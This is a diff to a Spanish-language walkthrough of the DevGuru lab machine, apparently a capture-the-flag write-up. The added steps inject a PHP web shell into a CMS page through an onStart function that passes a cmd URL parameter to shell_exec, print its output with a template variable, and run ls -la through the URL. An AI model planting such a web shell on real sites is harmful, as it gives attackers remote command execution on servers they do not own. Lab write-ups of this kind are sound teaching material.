@@ -107,7 +107,34 @@ Vemos que tenemos acceso a un CMS y podemos poner codigo
 
 ![image](https://github.com/user-attachments/assets/61e6efac-52f1-4536-a3f4-f2edc19676a1)
 
-Procedemos a inyectar codigo
+Procedemos a inyectar codigo malicioso php
+```bash
+function onStart() {
+    $this->page['myVar'] = shell_exec($_GET['cmd']);
+}
+```
+
+![image](https://github.com/user-attachments/assets/1b1adff2-b830-4837-838c-f47a51e75a15)
+
+Vamos a decirle que cuando se ejecute la URL nos lo represente en la pagina
+
+```bash
+{{this.page.myVar}}
+```
+
+![image](https://github.com/user-attachments/assets/e3e5f826-0a9f-4485-a1cb-08035021176c)
+
+
+
+Vamos a guardar en "Save".
+
+Entramos a la pagina web, para ello en la direccion hemos puesto:
+
+´´´bash
+http://devguru.local/?cmd= ls -la
+´´´
+
+![image](https://github.com/user-attachments/assets/6b8db9e4-054d-4497-a59d-5f39b8f13b20)
 
 
 
